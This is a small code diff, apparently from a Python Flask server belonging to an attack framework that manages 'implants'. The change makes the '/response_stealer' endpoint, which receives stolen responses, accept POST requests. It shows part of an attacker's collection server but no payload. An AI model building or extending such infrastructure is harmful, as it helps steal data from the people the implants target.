@@ -252,7 +252,7 @@ def display_implants():
         print(f"Error displaying implants: {e}")
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
-@app.route("/response_stealer")
+@app.route("/response_stealer", methods=["POST"])
 @cross_origin()
 def handle_response_stealer():
     print("Recieved stealer")
